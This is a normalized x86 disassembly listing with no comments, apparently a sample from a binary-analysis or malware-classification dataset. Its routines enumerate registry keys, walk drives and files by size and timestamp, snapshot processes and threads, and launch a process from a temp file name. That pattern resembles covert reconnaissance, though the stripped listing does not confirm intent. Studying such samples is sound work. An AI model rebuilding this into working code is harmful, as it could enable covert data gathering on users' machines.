lea eax [ ebp - 0x450 ]
push edi
push eax
call sub_41112d
add esp 0x30
push edi
push edi
push edi
push edi
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x250 ]
push eax
push [ ebp - 0x10 ]
mov [ ebp - 0x14 ] esi
push [ ebp - 0xc ]
call [ RegEnumKeyExA@IAT ]
test eax eax
jne r-xdata
cmp [ ebp - 0x8 ] edi
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0xa50 ]
push eax
push edi
push edi
push r--data
push [ ebp - 0x28 ]
call [ RegQueryValueExA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x450 ]
push eax
push [ ebp - 0x8 ]
lea eax [ ebp - 0xa50 ]
push eax
call sub_401fa0
add esp 0xc
test eax eax
jbe r-xdata
lea eax [ ebp - 0x450 ]
push eax
call sub_411738
test eax eax
pop ecx
jbe r-xdata
lea eax [ ebp - 0x250 ]
push eax
call sub_411738
push eax
lea eax [ ebp - 0x250 ]
push eax
lea eax [ ebp - 0x24 ]
push eax
call sub_40c364
add esp 0x10
push [ ebp - 0x20 ]
push [ ebp - 0x1c ]
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
lea ecx [ ebp - 0x40 ]
call sub_40ec7e
lea eax [ ebp - 0x450 ]
push eax
call sub_411738
sub esp 0xc
mov ecx esp
push eax
lea eax [ ebp - 0x450 ]
push eax
push ecx
call sub_40c364
add esp 0xc
lea eax [ ebp - 0x4d ]
push eax
lea ecx [ ebp - 0x24 ]
call sub_40f80b
lea ecx [ ebp - 0x4d ]
call sub_40f609
push [ ebp - 0x20 ]
push [ ebp - 0x1c ]
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
lea ecx [ ebp - 0x40 ]
call sub_40ec7e
lea ecx [ ebp - 0x24 ]
call sub_40f609
sub_4023b8
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
and [ esi + 0x4 ] 0x0
and [ esi ] 0x0
and [ esi + 0x8 ] 0x0
pop esi
retn
push eax
call sub_410d3e
pop ecx
sub_4023e6
mov eax [ esp + 0x4 ]
mov dx [ eax + 0x6 ]
mov ecx [ esp + 0x8 ]
cmp dx [ ecx + 0x6 ]
jne r-xdata
xor eax eax
retn
mov dx [ eax + 0x4 ]
cmp dx [ ecx + 0x4 ]
jne r-xdata
mov dx [ eax + 0x8 ]
cmp dx [ ecx + 0x8 ]
jne r-xdata
mov dx [ eax + 0xe ]
cmp dx [ ecx + 0xe ]
jne r-xdata
mov dx [ eax + 0xa ]
cmp dx [ ecx + 0xa ]
jne r-xdata
mov dx [ eax + 0x2 ]
cmp dx [ ecx + 0x2 ]
jne r-xdata
mov dx [ eax + 0xc ]
cmp dx [ ecx + 0xc ]
jne r-xdata
mov ax [ eax ]
cmp ax [ ecx ]
jne r-xdata
xor eax eax
inc eax
retn
sub_402443
mov eax [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
movzx edx [ eax ]
push esi
movzx esi [ ecx ]
cmp dx si
je r-xdata
movzx edx [ eax + 0x2 ]
movzx esi [ ecx + 0x2 ]
cmp dx si
jne r-xdata
sbb eax eax
neg eax
pop esi
retn
movzx edx [ eax + 0x6 ]
movzx esi [ ecx + 0x6 ]
cmp dx si
jne r-xdata
movzx edx [ eax + 0x8 ]
movzx esi [ ecx + 0x8 ]
cmp dx si
jne r-xdata
movzx edx [ eax + 0xa ]
movzx esi [ ecx + 0xa ]
cmp dx si
jne r-xdata
movzx edx [ eax + 0xc ]
movzx esi [ ecx + 0xc ]
cmp dx si
jne r-xdata
movzx eax [ eax + 0xe ]
movzx ecx [ ecx + 0xe ]
cmp ax cx
jne r-xdata
mov al 0x1
pop esi
retn
sub_4024d9
push esi
push edi
mov edi [ esp + 0xc ]
mov esi ecx
push [ esi ]
push [ edi ]
call sub_411692
test eax eax
pop ecx
pop ecx
jne r-xdata
xor eax eax
lea eax [ edi + 0x4 ]
push eax
lea eax [ esi + 0x4 ]
push eax
call sub_4023e6
test al al
pop ecx
pop ecx
je r-xdata
mov eax [ esi + 0x14 ]
cmp eax [ edi + 0x14 ]
jne r-xdata
xor eax eax
inc eax
jmp r-xdata
pop edi
pop esi
retn 0x4
sub_402517
push esi
push edi
mov edi [ esp + 0xc ]
lea eax [ edi + 0x4 ]
mov esi ecx
push eax
lea eax [ esi + 0x4 ]
push eax
call sub_402443
test al al
pop ecx
pop ecx
je r-xdata
mov eax [ esi + 0x14 ]
xor ecx ecx
cmp eax [ edi + 0x14 ]
setg cl
mov al cl
mov al 0x1
jmp r-xdata
pop edi
pop esi
retn 0x4
sub_402559
push ebp
lea ebp [ esp - 0x74 ]
sub esp 0x524
push ebx
push esi
mov esi [ ebp + 0x7c ]
mov ebx [ esi ]
push edi
push 0x1
call [ Sleep@IAT ]
test ebx ebx
jne r-xdata
cmp [ rw-data ] 0x92b8000
jge r-xdata
xor eax eax
inc eax
jmp r-xdata
xor eax eax
push ebx
call sub_411738
cmp eax 0x4
pop ecx
jb r-xdata
pop edi
pop esi
pop ebx
add ebp 0x74
leave
retn
push ebx
call sub_411738
cmp eax 0x5
pop ecx
jle r-xdata
add esi 0x4
push esi
push rw-data
call sub_402443
test al al
pop ecx
pop ecx
jne r-xdata
lea eax [ eax + ebx - 0x4 ]
push r--data
push eax
call sub_411747
pop ecx
push eax
call sub_41188f
test eax eax
pop ecx
pop ecx
je r-xdata
push rw-data
push esi
call sub_402443
test al al
pop ecx
pop ecx
jne r-xdata
lea ecx [ ebp + 0x54 ]
call sub_4024af
mov eax [ ebp + 0x7c ]
mov eax [ eax + 0x14 ]
add esi 0x4
lea edi [ ebp + 0x58 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add eax eax
movsd [ edi ] [ esi ]
lea ecx [ ebp + 0x34 ]
mov [ ebp + 0x68 ] eax
call sub_40f5f9
lea eax [ ebp + 0x34 ]
push eax
push ebx
call sub_40b318
test al al
pop ecx
pop ecx
je r-xdata
push 0xf
pop ecx
mov esi r--data
lea edi [ ebp - 0xb0 ]
[ edi ] [ esi ]
lea eax [ ebp + 0x70 ]
push eax
lea eax [ ebp - 0xb0 ]
movsw [ edi ] [ esi ]
mov [ ebp + 0x70 ] 0x3b
push eax
jmp r-xdata
lea ecx [ ebp + 0x34 ]
call sub_40f609
push [ ebp + 0x54 ]
call [ GlobalFree@IAT ]
jmp r-xdata
push [ ebp + 0x38 ]
push [ ebp + 0x54 ]
call sub_4116d8
push 0x3ff
lea eax [ ebp - 0x4af ]
push 0x0
push eax
mov [ ebp - 0x4b0 ] 0x0
call sub_41112d
push 0x3fe
push [ ebp + 0x54 ]
lea eax [ ebp - 0x4b0 ]
push eax
call sub_4117bc
lea eax [ ebp - 0x4b0 ]
push eax
mov [ ebp - 0xb1 ] 0x0
call sub_411738
add esp 0x24
lea ecx [ ebp - 0x4b0 ]
dec ecx
add eax ecx
jmp r-xdata
call sub_4119eb
test eax eax
pop ecx
pop ecx
jne r-xdata
cmp [ eax ] 0x5c
lea ecx [ ebp - 0x4b0 ]
jne r-xdata
push eax
push ebx
call sub_40c22b
test al al
pop ecx
pop ecx
jne r-xdata
jmp r-xdata
cmp eax ecx
jb r-xdata
cmp eax ecx
jb r-xdata
push r--data
push ebx
call sub_410c4c
mov edi eax
test edi edi
pop ecx
pop ecx
je r-xdata
lea eax [ ebp + 0x70 ]
push eax
push 0x0
lea eax [ ebp + 0x54 ]
push eax
call sub_402559
pop ecx
dec eax
mov [ eax ] 0x0
mov eax ecx
push eax
call [ GetFileAttributesA@IAT ]
cmp eax 0xffffffff
je r-xdata
push 0x2
push 0x0
push edi
call sub_410e24
push edi
call sub_410e80
push 0x0
push 0x0
push edi
mov esi eax
call sub_410e24
mov eax esi
cdq
and edx 0x3ff
add eax edx
sar eax 0xa
add esp 0x1c
cmp eax 0x13a0
jge r-xdata
lea eax [ ebp - 0x4b0 ]
push sub_402a89
push eax
call sub_40b07e
pop ecx
pop ecx
push edi
call sub_410b53
pop ecx
jmp r-xdata
cmp eax 0x1
jle r-xdata
push ebx
call sub_40d076
mov [ esp ] 0x1e61
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
lea ecx [ ebp + 0x58 ]
call sub_40eb9e
push [ rw-data ]
push 0x14
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
lea ecx [ ebp + 0x58 ]
call sub_40ec7e
push r--data
lea ecx [ ebp + 0x4 ]
call sub_40f45c
push [ ebp + 0xc ]
lea eax [ ebp + 0x24 ]
push [ ebp + 0x8 ]
push eax
call sub_40c364
add esp 0xc
push [ ebp + 0x28 ]
push [ ebp + 0x2c ]
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
lea ecx [ ebp + 0x58 ]
call sub_40ec7e
push ebx
call sub_411738
push eax
lea eax [ ebp + 0x14 ]
push ebx
push eax
call sub_40c364
add esp 0x10
push [ ebp + 0x18 ]
push [ ebp + 0x1c ]
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
lea ecx [ ebp + 0x58 ]
call sub_40ec7e
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp + 0x38 ]
push eax
push [ edi ]
call [ GetFileTime@IAT ]
lea eax [ ebp + 0x44 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
call [ FileTimeToSystemTime@IAT ]
movzx eax [ ebp + 0x50 ]
push eax
movzx eax [ ebp + 0x4e ]
push eax
movzx eax [ ebp + 0x4c ]
push eax
movzx eax [ ebp + 0x4a ]
push eax
movzx eax [ ebp + 0x46 ]
push eax
movzx eax [ ebp + 0x44 ]
push eax
lea eax [ ebp - 0x70 ]
push r--data
push eax
call sub_4115cd
add esp 0x20
lea eax [ ebp - 0x70 ]
push eax
push eax
call [ lstrlenA@IAT ]
push eax
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
lea ecx [ ebp + 0x58 ]
call sub_40ec7e
push esi
call sub_411160
push edi
push 0x1
push esi
push eax
mov [ ebp + 0x7c ] eax
call sub_410d0d
add esp 0x14
push [ ebp + 0x7c ]
push esi
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
lea ecx [ ebp + 0x58 ]
call sub_40ec7e
lea ecx [ ebp + 0x14 ]
call sub_40f609
lea ecx [ ebp + 0x24 ]
call sub_40f609
lea ecx [ ebp + 0x4 ]
call sub_40f609
lea ecx [ ebp + 0x58 ]
call sub_40ed8a
push ebx
lea eax [ ebp - 0x70 ]
push eax
push esi
push [ ebp + 0x7c ]
call sub_40ab31
mov ebx eax
push ebx
call sub_40ab99
add esp 0x14
test eax eax
je r-xdata
push ebx
call sub_410a7a
push [ ebp + 0x7c ]
call sub_410a7a
pop ecx
pop ecx
mov esi rw-data
mov ecx esi
call sub_4023b8
add [ rw-data ] 0x3
movzx eax [ rw-data ]
and [ rw-data ] 0x0
push eax
mov ecx esi
call sub_40f645
mov eax [ rw-data ]
sar eax 0x8
push eax
mov ecx esi
call sub_40f645
movzx eax [ rw-data ]
push eax
mov ecx esi
call sub_40f645
movzx eax [ rw-data ]
push eax
mov ecx esi
call sub_40f645
sub [ rw-data ] 0x3
mov eax [ rw-data ]
cmp eax 0x92b8000
jge r-xdata
add eax [ rw-data ]
mov esi rw-data
mov ecx esi
mov [ rw-data ] eax
call sub_40ee85
cmp [ rw-data ] 0xf
jle r-xdata
push esi
call sub_40d15c
test al al
pop ecx
je r-xdata
push ebx
call sub_40abc9
pop ecx
sub_4029f8
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov edx [ eax ]
sub esp 0x10
push esi
mov esi [ ecx ]
mov [ eax ] esi
mov esi [ ecx + 0x14 ]
push edi
mov [ ecx ] edx
mov edx [ eax + 0x14 ]
mov [ eax + 0x14 ] esi
mov [ ecx + 0x14 ] edx
add eax 0x4
mov esi eax
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add ecx 0x4
mov esi ecx
mov edi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea esi [ ebp - 0x10 ]
mov edi ecx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
leave
retn
sub_402a3e
push esi
call sub_40b559
mov esi [ rw-data ]
test esi esi
je r-xdata
pop esi
retn
push edi
mov esi [ esi + 0x18 ]
test esi esi
jne r-xdata
push esi
mov ecx edi
call sub_402517
test al al
jne r-xdata
mov edi [ esi + 0x18 ]
test edi edi
je r-xdata
pop edi
push esi
mov ecx edi
call sub_4024d9
test al al
jne r-xdata
push [ esi + 0x18 ]
push esi
call sub_4029f8
mov esi [ rw-data ]
pop ecx
pop ecx
sub_402a89
push ebp
mov ebp esp
sub esp 0x7c
push ebx
push esi
mov esi [ ebp + 0x8 ]
test esi esi
push edi
jne r-xdata
push esi
call [ lstrlenA@IAT ]
cmp eax 0x3
jl r-xdata
xor eax eax
jmp r-xdata
cmp [ esi ] 0x2e
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ ebp + 0xc ]
mov ebx [ eax + 0x20 ]
and [ ebp - 0x8 ] 0x0
shr ebx 0xa
cmp [ eax + 0x1c ] 0x0
mov [ ebp - 0xc ] ebx
je r-xdata
push 0xf
pop ecx
mov esi r--data
lea edi [ ebp - 0x7c ]
[ edi ] [ esi ]
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x7c ]
push eax
movsw [ edi ] [ esi ]
mov [ ebp - 0x4 ] 0x3b
call sub_4119eb
xor esi esi
jmp r-xdata
mov [ ebp - 0xc ] 0x5f5e100
mov ebx [ ebp - 0xc ]
cmp eax esi
pop ecx
pop ecx
jne r-xdata
push eax
push [ ebp + 0x8 ]
call sub_40c22b
test al al
pop ecx
pop ecx
je r-xdata
jmp r-xdata
lea eax [ ebp - 0x4 ]
push eax
push esi
call sub_4119eb
cmp ebx 0x13a0
jge r-xdata
push [ ebp + 0x8 ]
call [ lstrlenA@IAT ]
push eax
push [ ebp + 0x8 ]
lea eax [ ebp - 0x1c ]
push eax
call sub_40c364
add esp 0xc
cmp [ ebp - 0x8 ] esi
je r-xdata
xor eax eax
inc eax
cmp ebx eax
jg r-xdata
push [ ebp + 0x8 ]
call sub_40d076
cmp [ ebp - 0x8 ] esi
pop ecx
je r-xdata
sub esp 0x10
lea eax [ ebp - 0x1c ]
mov ecx esp
push eax
call sub_40f594
lea eax [ ebp - 0x2c ]
push eax
push r--data
lea ecx [ ebp - 0x39 ]
call sub_40f45c
mov ecx eax
call sub_40f70c
lea ecx [ ebp - 0x39 ]
call sub_40f609
sub esp 0x10
lea eax [ ebp - 0x2c ]
mov ecx esp
push eax
call sub_40f594
lea eax [ ebp - 0x39 ]
push eax
lea ecx [ ebp - 0x1c ]
call sub_40f80b
lea ecx [ ebp - 0x39 ]
call sub_40f609
lea ecx [ ebp - 0x2c ]
call sub_40f609
mov [ ebp - 0x8 ] eax
lea ecx [ ebp - 0x1c ]
call sub_40f609
xor eax eax
inc eax
push 0x1c
call sub_411160
cmp eax esi
pop ecx
je r-xdata
xor ebx ebx
mov ecx eax
call sub_4024af
mov ebx eax
jmp r-xdata
push [ ebp + 0x8 ]
push [ ebx ]
call sub_4116d8
mov eax [ ebp - 0xc ]
pop ecx
mov [ ebx + 0x14 ] eax
pop ecx
lea eax [ ebp - 0x3c ]
push eax
mov eax [ ebp + 0xc ]
add eax 0x14
push eax
call [ FileTimeToSystemTime@IAT ]
lea edi [ ebx + 0x4 ]
lea esi [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
and [ ebx + 0x18 ] 0x0
mov eax [ rw-data ]
mov esi rw-data
mov [ eax + 0x18 ] ebx
mov ecx esi
mov [ rw-data ] ebx
call sub_4023b8
add [ rw-data ] 0x3
movzx eax [ rw-data ]
and [ rw-data ] 0x0
push eax
mov ecx esi
call sub_40f645
mov eax [ rw-data ]
sar eax 0x8
push eax
mov ecx esi
call sub_40f645
movzx eax [ rw-data ]
push eax
mov ecx esi
call sub_40f645
movzx eax [ rw-data ]
push eax
mov ecx esi
call sub_40f645
sub [ rw-data ] 0x3
push ebx
call sub_402559
pop ecx
sub_402c7f
push ebp
mov ebp esp
sub esp 0x45c
push ebx
push esi
push edi
lea eax [ ebp - 0x5c ]
push eax
push r--data
mov edi r--data
push edi
mov esi 0x80000001
push esi
call sub_40c03c
lea eax [ ebp - 0x58 ]
push eax
push r--data
push edi
push esi
call sub_40c03c
lea eax [ ebp - 0x1c ]
push eax
push r--data
push edi
push esi
call sub_40c03c
lea eax [ ebp - 0x18 ]
push eax
push r--data
push edi
push esi
call sub_40c03c
add esp 0x40
xor ebx ebx
push 0x1c
mov [ rw-data ] ebx
call sub_411160
cmp eax ebx
pop ecx
je r-xdata
xor eax eax
mov ecx eax
call sub_4024af
jmp r-xdata
mov [ rw-data ] ebx
push 0x3e8
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
mov ecx edi
call sub_40eb9e
mov [ rw-data ] eax
jmp r-xdata
mov [ rw-data ] eax
mov [ rw-data ] eax
call sub_40ac5b
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x8 ]
push eax
mov esi r--data
push esi
push r--data
call sub_4115f3
mov ax [ ebp - 0x8 ]
mov [ rw-data ] ax
mov ax [ ebp - 0x10 ]
mov [ rw-data ] ax
mov ax [ ebp - 0x4 ]
mov [ rw-data ] ax
mov ax [ ebp - 0xc ]
mov [ rw-data ] ax
mov ax [ ebp - 0x14 ]
mov [ rw-data ] ax
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x8 ]
push eax
push esi
push r--data
call sub_4115f3
mov ax [ ebp - 0x8 ]
mov [ rw-data ] ax
mov ax [ ebp - 0x10 ]
mov [ rw-data ] ax
mov ax [ ebp - 0x4 ]
mov [ rw-data ] ax
mov ax [ ebp - 0xc ]
mov [ rw-data ] ax
mov ax [ ebp - 0x14 ]
add esp 0x38
mov [ rw-data ] ax
call sub_40bb9f
mov esi rw-data
mov ecx esi
call sub_4023b8
add [ rw-data ] 0x2
movzx eax [ rw-data ]
push eax
mov ecx esi
mov [ rw-data ] ebx
call sub_40f645
mov eax [ rw-data ]
sar eax 0x8
push eax
mov ecx esi
call sub_40f645
movzx eax [ rw-data ]
push eax
mov ecx esi
call sub_40f645
movzx eax [ rw-data ]
push eax
mov ecx esi
call sub_40f645
sub [ rw-data ] 0x2
push 0x15
call sub_411160
mov edi eax
cmp edi ebx
pop ecx
je r-xdata
push 0x15
call sub_411160
mov edi eax
cmp edi ebx
pop ecx
je r-xdata
call sub_40ed8a
push edi
call sub_410a7a
pop ecx
push [ rw-data ]
push 0x14
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
mov ecx [ rw-data ]
call sub_40ec7e
push r--data
lea ecx [ ebp - 0x38 ]
call sub_40f45c
push [ ebp - 0x30 ]
lea eax [ ebp - 0x48 ]
push [ ebp - 0x34 ]
push eax
call sub_40c364
add esp 0xc
push [ ebp - 0x44 ]
push [ ebp - 0x40 ]
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
mov ecx [ rw-data ]
call sub_40ec7e
mov eax [ rw-data ]
inc [ rw-data ]
lea ecx [ ebp - 0x54 ]
push ecx
push eax
call sub_40df39
pop ecx
pop ecx
lea eax [ ebp - 0x54 ]
push eax
push eax
call sub_411738
pop ecx
push eax
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
mov ecx [ rw-data ]
call sub_40ec7e
mov ecx [ rw-data ]
cmp ecx ebx
mov edi ecx
je r-xdata
mov [ rw-data ] ebx
push 0x3e8
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
mov ecx edi
call sub_40eb9e
mov [ rw-data ] eax
jmp r-xdata
lea eax [ ebp - 0x28 ]
push edi
push eax
mov [ ebp - 0x28 ] bl
call sub_40b07e
inc bl
cmp bl 0x5a
pop ecx
pop ecx
jle r-xdata
push [ ebp - 0x1c ]
lea eax [ ebp - 0x45c ]
push eax
call sub_4116d8
mov ebx r--data
lea eax [ ebp - 0x45c ]
push ebx
push eax
call sub_41188f
add esp 0x10
test eax eax
je r-xdata
mov [ ebp - 0x28 ] 0x5c3a43
xor eax eax
lea edi [ ebp - 0x24 ]
stosd [ edi ]
stosw [ edi ]
mov bl 0x41
mov edi sub_402a89
call sub_40b79a
push 0x3e8
call sub_411160
push [ ebp - 0x18 ]
mov ebx eax
push ebx
call sub_4116d8
push r--data
push ebx
call sub_411657
push edi
push ebx
call sub_40b07e
mov ecx [ rw-data ]
add esp 0x1c
test ecx ecx
mov edi ecx
je r-xdata
inc eax
push ebx
push eax
call sub_41188f
test eax eax
pop ecx
pop ecx
je r-xdata
call sub_40bdbc
mov ecx esi
call sub_4023b8
add [ rw-data ] 0x3
movzx eax [ rw-data ]
and [ rw-data ] 0x0
push eax
mov ecx esi
call sub_40f645
mov eax [ rw-data ]
sar eax 0x8
push eax
mov ecx esi
call sub_40f645
movzx eax [ rw-data ]
push eax
mov ecx esi
call sub_40f645
movzx eax [ rw-data ]
push eax
mov ecx esi
call sub_40f645
sub [ rw-data ] 0x3
mov esi [ rw-data ]
jmp r-xdata
call sub_40ed8a
push edi
call sub_410a7a
pop ecx
mov [ eax ] 0x0
lea eax [ ebp - 0x45c ]
push edi
push eax
call sub_40b07e
pop ecx
pop ecx
test esi esi
jne r-xdata
push esi
call sub_402559
mov esi [ esi + 0x18 ]
pop ecx
mov esi rw-data
mov ecx esi
call sub_40ee85
cmp [ rw-data ] 0xf
jle r-xdata
lea ecx [ ebp - 0x48 ]
call sub_40f609
lea ecx [ ebp - 0x38 ]
call sub_40f609
pop edi
pop esi
pop ebx
leave
retn
push esi
call sub_40d15c
pop ecx
sub_403094
push ebp
mov ebp esp
sub esp 0x18
push 0x3e8
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
lea ecx [ ebp - 0x18 ]
call sub_40eb9e
push [ ebp + 0x8 ]
push [ ebp + 0x8 ]
call [ lstrlenA@IAT ]
push eax
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
lea ecx [ ebp - 0x18 ]
call sub_40ec7e
lea ecx [ ebp - 0x18 ]
call sub_40ed8a
leave
retn
sub_4030e4
push ebp
mov ebp esp
mov eax 0x1034
call sub_40f8bc
push ebx
push esi
push edi
push 0x3e8
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
lea ecx [ ebp - 0x34 ]
call sub_40eb9e
lea eax [ ebp - 0x10 ]
push eax
push r--data
push 0x80000002
call [ RegOpenKeyA@IAT ]
test eax eax
jne r-xdata
lea ecx [ ebp - 0x34 ]
call sub_40ed8a
pop edi
pop esi
pop ebx
leave
retn
xor ebx ebx
mov [ ebp - 0x4 ] ebx
inc [ ebp - 0x4 ]
cmp [ ebp - 0x18 ] ebx
je r-xdata
push 0xd
pop ecx
mov esi r--data
lea edi [ ebp - 0xc34 ]
[ edi ] [ esi ]
push 0x3cb
lea eax [ ebp - 0xbff ]
push ebx
push eax
movsb [ edi ] [ esi ]
call sub_41112d
add esp 0xc
lea eax [ ebp - 0x1034 ]
push eax
lea eax [ ebp - 0xc34 ]
push eax
call [ lstrcatA@IAT ]
xor edi edi
push 0x400
lea eax [ ebp - 0x1034 ]
push eax
push [ ebp - 0x4 ]
push [ ebp - 0x10 ]
call [ RegEnumKeyA@IAT ]
cmp eax ebx
mov [ ebp - 0x18 ] eax
jne r-xdata
push [ ebp - 0x10 ]
call [ RegCloseKey@IAT ]
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x434 ]
push eax
push ebx
push ebx
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x834 ]
push eax
push edi
push [ ebp - 0x8 ]
call [ RegEnumValueA@IAT ]
push [ ebp - 0x8 ]
mov [ ebp - 0x14 ] eax
call [ RegCloseKey@IAT ]
push r--data
lea eax [ ebp - 0x834 ]
push eax
inc edi
call [ lstrcmpA@IAT ]
test eax eax
jne r-xdata
cmp [ ebp - 0x14 ] ebx
je r-xdata
cmp [ ebp - 0xc ] ebx
je r-xdata
push 0x3fe
lea eax [ ebp - 0x832 ]
push ebx
mov esi 0x3ff
push eax
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x834 ] bx
call sub_41112d
add esp 0xc
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0xc34 ]
push eax
push 0x80000002
mov [ ebp - 0xc ] esi
call [ RegOpenKeyA@IAT ]
test eax eax
jne r-xdata
mov esi [ StrStrIA@IAT ]
push r--data
lea eax [ ebp - 0x434 ]
push eax
call esi
test eax eax
je r-xdata
push r--data
lea eax [ ebp - 0x434 ]
push eax
call esi
test eax eax
je r-xdata
mov [ rw-data ] 0x1
lea eax [ ebp - 0x434 ]
push eax
push eax
call [ lstrlenA@IAT ]
push eax
lea eax [ ebp - 0x34 ]
push eax
call sub_40cd53
lea eax [ ebp - 0x434 ]
push eax
call sub_40d076
add esp 0x10
mov [ rw-data ] 0x1
sub_4032c1
push ebp
mov ebp esp
sub esp 0x2c
push ebx
push esi
push edi
push 0x0
call sub_40f16a
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push 0x0
movsd [ edi ] [ esi ]
call sub_40f2e7
mov esi [ Sleep@IAT ]
pop ecx
pop ecx
push 0x1
call esi
push [ ebp - 0x10 ]
push 0x4
call CreateToolhelp32Snapshot
mov edi eax
cmp edi 0xffffffff
je r-xdata
xor eax eax
mov ebx [ CloseHandle@IAT ]
push edi
call ebx
mov eax [ ebp - 0x20 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
lea eax [ ebp - 0x2c ]
push eax
push edi
call Thread32Next
test eax eax
jne r-xdata
push 0x0
push sub_4032af
push [ ebp - 0x24 ]
call [ EnumThreadWindows@IAT ]
push edi
call ebx
push 0x0
call sub_40f16a
mov edi [ rw-data ]
push 0x0
call sub_40f2e7
test edi edi
pop ecx
pop ecx
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x4
push 0x1
call esi
push [ ebp - 0x10 ]
push 0x4
call CreateToolhelp32Snapshot
mov edi eax
cmp edi 0xffffffff
jne r-xdata
lea eax [ ebp - 0x2c ]
push eax
push edi
mov [ ebp - 0x2c ] 0x1c
call Thread32First
test eax eax
je r-xdata
jmp r-xdata
sub_403380
push ebp
mov ebp esp
mov eax 0x30ec
call sub_40f8bc
push ebx
push esi
push edi
push 0x3e8
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
lea ecx [ ebp - 0x2c ]
call sub_40eb9e
lea eax [ ebp - 0x104 ]
push eax
mov [ ebp - 0x104 ] 0x94
call [ GetVersionExA@IAT ]
test eax eax
je r-xdata
lea ecx [ ebp - 0x2c ]
call sub_40ed8a
pop edi
pop esi
pop ebx
leave
retn
push 0x10
xor esi esi
lea eax [ ebp - 0x14 ]
push esi
push eax
call sub_41112d
push 0x44
pop edi
push edi
lea eax [ ebp - 0x70 ]
push esi
push eax
call sub_41112d
add esp 0x18
lea eax [ ebp - 0x30ec ]
mov [ ebp - 0x70 ] edi
push eax
mov edi 0xff6
push edi
call [ GetTempPathA@IAT ]
cmp eax edi
ja r-xdata
cmp eax esi
je r-xdata
lea eax [ ebp - 0x20f4 ]
push eax
push esi
push esi
lea eax [ ebp - 0x30ec ]
push eax
call [ GetTempFileNameA@IAT ]
test eax eax
je r-xdata
push edi
lea eax [ ebp - 0x10fc ]
push eax
call [ GetSystemDirectoryA@IAT ]
lea eax [ ebp - 0x10fc ]
push r--data
push eax
call sub_4116d8
lea eax [ ebp - 0x10fc ]
push r--data
push eax
call sub_411657
lea eax [ ebp - 0x20f4 ]
push eax
lea eax [ ebp - 0x10fc ]
push eax
call sub_411657
mov ebx r--data
lea eax [ ebp - 0x10fc ]
push ebx
push eax
call sub_411657
mov edi [ CreateProcessA@IAT ]
add esp 0x20
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
push esi
push esi
push esi
push esi
push esi
push esi
lea eax [ ebp - 0x10fc ]
push eax
push esi
call edi
cmp [ ebp - 0xc ] esi
jne r-xdata
xor edi edi
inc edi
cmp [ ebp - 0x100 ] 0x5
mov [ rw-data ] edi
jbe r-xdata
push r--data
call sub_410ec4
push eax
lea eax [ ebp - 0x10fc ]
push eax
call sub_4116d8
lea eax [ ebp - 0x10fc ]
push r--data
push eax
call sub_411657
lea eax [ ebp - 0x10fc ]
push r--data
push eax
call sub_411657
lea eax [ ebp - 0x20f4 ]
push eax
lea eax [ ebp - 0x10fc ]
push eax
call sub_411657
lea eax [ ebp - 0x10fc ]
push ebx
push eax
call sub_411657
add esp 0x2c
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
push esi
push esi
push esi
push esi
push esi
push esi
lea eax [ ebp - 0x10fc ]
push eax
push esi
call edi
test eax eax
je r-xdata
push 0xffffffff
push [ ebp - 0x14 ]
call [ WaitForSingleObject@IAT ]
push esi
call sub_40f16a
push esi
mov [ rw-data ] edi
call sub_40f2e7
